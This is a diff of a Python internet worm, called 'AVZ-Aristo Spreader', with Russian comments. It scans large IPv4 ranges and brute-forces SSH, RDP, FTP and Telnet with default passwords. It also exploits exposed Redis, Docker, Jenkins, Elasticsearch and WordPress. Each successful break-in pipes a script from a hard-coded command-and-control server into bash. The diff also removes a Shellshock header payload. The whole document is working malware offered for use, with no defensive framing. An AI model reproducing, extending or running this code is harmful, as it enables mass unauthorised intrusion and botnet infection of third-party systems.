@@ -1,23 +1,27 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.8.9 – port stats, detailed diagnostics
-import asyncio, aiohttp, random, socket, time, json, os, sys, argparse
+# AVZ-Aristo Spreader v25.10.4 – AGENT_URL через порт 8080, детальные логи
+import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess
 import ipaddress, logging
-
+import resource
+resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
 logging.getLogger("paramiko").setLevel(logging.CRITICAL)
 
 C2_HOST = "80.249.146.202"
-C2_PORT = 80
-AGENT_URL = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
-MAX_CONCURRENT = 500
+C2_PORT = 80                    # TCP для команд/регистрации
+API_PORT = 8080                 # HTTP API для скачивания агента
+AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
+AGENT_PY_URL = f"http://{C2_HOST}:{API_PORT}/agent.py"
+MAX_CONCURRENT = 200
 TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 10_000
-PORT_LIST = [22, 23, 80, 443, 2375, 6379, 8080, 9200]
+PORT_LIST = [21, 22, 23, 80, 443, 2375, 3389, 6379, 8080, 9200]
 
-SSH_CREDS = [
+CREDS = [
     ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"),
     ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"),
     ("user","user"), ("user","password"), ("user","123456"),
-    ("test","test"), ("guest","guest"), ("root",""), ("admin",""), ("root","pceeq1s8wv")
+    ("test","test"), ("guest","guest"), ("root",""), ("admin",""), ("root","pceeq1s8wv"),
+    ("Administrator",""), ("Administrator","admin"), ("Administrator","123456")
 ]
 
 RANGES = [f"{i}.0.0.0/8" for i in [1,2,3,4,5,8,9,12,14,15,20,23,24,31,34,35,37,38,40,41,43,44,45,46,47,49,50,51,52,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223]]
@@ -48,32 +52,85 @@ async def probe_port(ip, port):
         return False
 
 async def ssh_brute(ip):
+    """Пытается paramiko, asyncssh, sshpass"""
     try:
         import paramiko
-        for u, p in SSH_CREDS:
+        for u, p in CREDS:
             try:
                 client = paramiko.SSHClient()
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(ip, username=u, password=p, timeout=2, banner_timeout=2, auth_timeout=2)
-                client.exec_command(f"wget -O- {AGENT_URL} | sh")
+                client.connect(ip, username=u, password=p, timeout=3, banner_timeout=2, auth_timeout=2, allow_agent=False, look_for_keys=False)
+                client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
                 client.close()
                 return True
-            except:
+            except Exception as e:
+                print(f"[!] SSH paramiko {ip}:{u}:{p} - {e}")
                 continue
     except ImportError:
-        pass
+        print("[!] paramiko not installed")
+    try:
+        import asyncssh
+        for u, p in CREDS:
+            try:
+                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
+                    await conn.run(f"wget -O- {AGENT_URL} | bash")
+                    return True
+            except Exception as e:
+                print(f"[!] SSH asyncssh {ip}:{u}:{p} - {e}")
+                continue
+    except ImportError:
+        print("[!] asyncssh not installed")
+    for u, p in CREDS:
+        cmd = f"sshpass -p '{p}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {u}@{ip} 'wget -O- {AGENT_URL} | bash'"
+        try:
+            subprocess.run(cmd, shell=True, timeout=4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return True
+        except Exception as e:
+            print(f"[!] SSH sshpass {ip}:{u}:{p} - {e}")
     return False
 
-async def exploit_http(ip):
-    urls = [f"http://{ip}/", f"http://{ip}/cgi-bin/"]
-    headers = {"User-Agent": f"() {{ :; }}; wget -O- {AGENT_URL} | bash"}
-    for url in urls:
+async def rdp_brute(ip):
+    """RDP через xfreerdp (только Linux)"""
+    if sys.platform != 'linux':
+        return False
+    for u, p in CREDS:
+        cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
+        proc = await asyncio.create_subprocess_shell(
+            cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL
+        )
         try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, headers=headers, timeout=2) as resp:
-                    pass
-        except:
-            pass
+            await asyncio.wait_for(proc.communicate(), timeout=3)
+            if proc.returncode == 0:
+                await asyncio.create_subprocess_shell(
+                    f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'"
+                )
+                return True
+        except Exception as e:
+            print(f"[!] RDP {ip}:{u}:{p} - {e}")
+    return False
+
+async def ftp_brute(ip):
+    for u, p in CREDS:
+        try:
+            ftp = ftplib.FTP()
+            ftp.connect(ip, 21, timeout=TIMEOUT)
+            ftp.login(u, p)
+            with open("/tmp/agent.sh", "w") as f:
+                f.write(f"wget -O- {AGENT_URL} | bash")
+            with open("/tmp/agent.sh", "rb") as f:
+                ftp.storbinary("STOR agent.sh", f)
+            ftp.quit()
+            return True
+        except Exception as e:
+            print(f"[!] FTP {ip}:{u}:{p} - {e}")
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(ip, 21, timeout=TIMEOUT)
+        ftp.login()
+        ftp.quit()
+        return True
+    except:
+        pass
     return False
 
 async def exploit_redis(ip):
@@ -86,8 +143,8 @@ async def exploit_redis(ip):
         r.config_set('dbfilename', 'authorized_keys')
         r.save(); r.close()
         return True
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Redis {ip} - {e}")
     return False
 
 async def exploit_docker(ip):
@@ -97,8 +154,8 @@ async def exploit_docker(ip):
         client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
         client.close()
         return True
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Docker {ip} - {e}")
     return False
 
 async def exploit_jenkins(ip):
@@ -108,12 +165,12 @@ async def exploit_jenkins(ip):
         async with aiohttp.ClientSession() as s:
             async with s.post(url, data={'script': script}, timeout=2) as resp:
                 return resp.status == 200
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Jenkins {ip} - {e}")
     return False
 
 async def exploit_telnet(ip):
-    for u, p in SSH_CREDS:
+    for u, p in CREDS:
         try:
             reader, writer = await asyncio.wait_for(
                 asyncio.open_connection(ip, 23), timeout=TIMEOUT
@@ -142,8 +199,8 @@ async def exploit_telnet(ip):
                     writer.close()
                     return True
             writer.close()
-        except:
-            pass
+        except Exception as e:
+            print(f"[!] Telnet {ip}:{u}:{p} - {e}")
     return False
 
 async def exploit_elasticsearch(ip):
@@ -152,8 +209,8 @@ async def exploit_elasticsearch(ip):
         async with aiohttp.ClientSession() as s:
             async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
                 return resp.status == 200
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] Elasticsearch {ip} - {e}")
     return False
 
 async def exploit_wordpress(ip):
@@ -162,8 +219,8 @@ async def exploit_wordpress(ip):
             async with s.post(f'http://{ip}/xmlrpc.php', data='<methodCall><methodName>system.listMethods</methodName></methodCall>', timeout=2) as resp:
                 if resp.status == 200:
                     return True
-    except:
-        pass
+    except Exception as e:
+        print(f"[!] WordPress {ip} - {e}")
     return False
 
 async def infect(ip, port_stats):
@@ -172,27 +229,34 @@ async def infect(ip, port_stats):
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
-    if open_ports[0] and await ssh_brute(ip):
+    if open_ports[2] and await ssh_brute(ip):
         print(f"[INFECTED] {ip} via SSH", flush=True)
         return True
-    if open_ports[5] and await exploit_redis(ip):
+    if open_ports[6] and await rdp_brute(ip):
+        print(f"[INFECTED] {ip} via RDP", flush=True)
+        return True
+    if open_ports[0] and await ftp_brute(ip):
+        print(f"[INFECTED] {ip} via FTP", flush=True)
+        return True
+    if open_ports[7] and await exploit_redis(ip):
         print(f"[INFECTED] {ip} via Redis", flush=True)
         return True
-    if open_ports[4] and await exploit_docker(ip):
+    if open_ports[5] and await exploit_docker(ip):
         print(f"[INFECTED] {ip} via Docker", flush=True)
         return True
-    if open_ports[6] and await exploit_jenkins(ip):
+    if open_ports[8] and await exploit_jenkins(ip):
         print(f"[INFECTED] {ip} via Jenkins", flush=True)
         return True
-    if open_ports[1] and await exploit_telnet(ip):
+    if open_ports[3] and await exploit_telnet(ip):
         print(f"[INFECTED] {ip} via Telnet", flush=True)
         return True
-    if open_ports[7] and await exploit_elasticsearch(ip):
+    if open_ports[9] and await exploit_elasticsearch(ip):
         print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
         return True
-    if (open_ports[2] or open_ports[3]) and await exploit_http(ip):
-        print(f"[INFECTED] {ip} via HTTP", flush=True)
-        return True
+    if open_ports[4] or open_ports[5]:
+        if await exploit_wordpress(ip):
+            print(f"[INFECTED] {ip} via WordPress", flush=True)
+            return True
     return False
 
 async def worker(queue, stats, port_stats, progress_cb=None):
